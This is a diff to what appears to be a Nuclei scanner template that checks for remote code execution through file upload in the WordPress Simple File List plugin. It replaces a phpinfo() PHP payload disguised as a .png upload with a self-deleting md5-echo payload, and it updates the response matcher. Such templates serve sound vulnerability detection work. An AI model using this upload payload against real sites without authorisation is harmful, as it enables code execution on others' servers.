@@ -15,8 +15,10 @@ info:
   metadata:
     max-request: 3
   tags: wp,wpscan,wordpress,wp-plugin,rce,intrusive,fileupload
+
 variables:
   filepath: '{{rand_base(7, "abcdefghi")}}'
+  string: "wordpress-rce-simplefilelist"
 
 http:
   - raw:
@@ -46,7 +48,7 @@ http:
         Content-Disposition: form-data; name="file"; filename="{{filepath}}.png"
         Content-Type: image/png
 
-        <?php echo md5("wordpress-rce-simplefilelist"); phpinfo(); ?>
+        <?php echo md5("{{string}}");unlink(__FILE__);?>
         --6985fa39c0698d07f6d418b37388e1b2--
       - |
         POST /wp-content/plugins/simple-file-list/ee-file-engine.php HTTP/1.1
@@ -63,12 +65,9 @@ http:
     matchers-condition: and
     matchers:
       - type: word
-        part: body
+        part: body_3
         words:
-          - "aa5be3e9dec96f2f1a593b2f5b2288af"
-          - "PHP Version"
-          - "Configuration Command"
-        condition: and
+          - '{{md5(string)}}'
 
       - type: status
         status:
